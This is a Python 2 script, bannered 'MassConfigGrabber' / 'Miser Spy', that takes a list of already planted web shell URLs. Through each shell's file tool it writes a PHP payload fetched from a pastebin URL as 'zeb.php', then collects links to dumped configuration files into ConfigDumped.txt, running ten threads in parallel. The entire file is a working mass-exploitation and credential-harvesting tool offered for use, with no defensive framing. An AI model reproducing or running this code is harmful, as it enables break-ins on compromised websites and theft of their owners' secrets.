#!/usr/bin/python
 # -*-coding:Latin-1 -*
import sys,urllib2
from colorama import *

from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore								
from colorama import Style								
from termcolor import colored
import requests, sys, re, os, time, random
from colorama import Fore, Back, Style
init()

la7mar  = '\033[91m'
lazra9  = '\033[94m'
la5dhar = '\033[92m'
movv    = '\033[95m'
lasfar  = '\033[93m'
ramadi  = '\033[90m'
blid    = '\033[1m'
star    = '\033[4m'
bigas   = '\033[07m'
bigbbs  = '\033[27m'
hell    = '\033[05m'
saker   = '\033[25m'
labyadh = '\033[00m'
cyan    = '\033[0;96m'
r = Fore.RED
g = Fore.GREEN
w = Fore.WHITE
b = Fore.BLUE
y = Fore.YELLOW
m = Fore.MAGENTA


def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])


def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """


  __  __                _____             __ _        _____       _     _               
 |  \/  |              / ____|           / _(_)      / ____|     | |   | |              
 | \  / | __ _ ___ ___| |     ___  _ __ | |_ _  __ _| |  __  __ _| |__ | |__   ___ _ __ 
 | |\/| |/ _` / __/ __| |    / _ \| '_ \|  _| |/ _` | | |_ |/ _` | '_ \| '_ \ / _ \ '__|
 | |  | | (_| \__ \__ \ |___| (_) | | | | | | | (_| | |__| | (_| | |_) | |_) |  __/ |   
 |_|  |_|\__,_|___/___/\_____\___/|_| |_|_| |_|\__, |\_____|\__,_|_.__/|_.__/ \___|_|   
                                                __/ |                                   
                                               |___/                                    
                                                          
          Miser Spy                                                                                                                         
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)



cls()
print_logo()
def upload(url, script, filename):
    try:
        shell = '<'+requests.get(script).text
        url = url.replace('\n', '').replace('\r', '')
        rzlt = requests.get(url,  headers = {'User-agent': 'Mozilla/5.0'} ,timeout=7).text
        namec = rzlt.split("<input type=hidden name=c value='")[1]
        namec = namec.split("'")[0]
        namech = rzlt.split("<input type=hidden name=charset value='")[1]
        namech = namech.split("'")[0]
        values = {'a':'FilesTools','c':namec,'p1':filename,'p2':'mkfile','p3':shell,'charset':namech,'f':filename}
        r =  requests.post(url, headers = {'User-agent': 'Mozilla/5.0'} , data = values  ,timeout=7)
        urlx = url.split("/")
        kk = url.replace(urlx[len(urlx)-1] , filename)
        rzlt = requests.get(kk,  headers = {'User-agent': 'Mozilla/5.0'} ,timeout=7).text
        return kk
    except:
        pass
def get_config(url):
    try:
        test = upload(url, "https://pastebin.com/raw/5LPZ7L4c", "zeb.php")
        new=test.replace("zeb.php", "home")
        r = requests.get(new)
        if ".txt" in r.content:
            print new
            with open('ConfigDumped.txt', 'a') as oo:
                oo.write(new+"\n")
    except:
        pass

def main():    
   
    for i in ListPass:
        try:
            i = i.strip()
            data=get_config(i)
        except:
            pass
spy = raw_input('Enter List Of Shells :')
ListPass = open(spy, 'r').readlines()      
pool = ThreadPool(10)
pool.map(get_config, ListPass)
pool.close()
pool.join()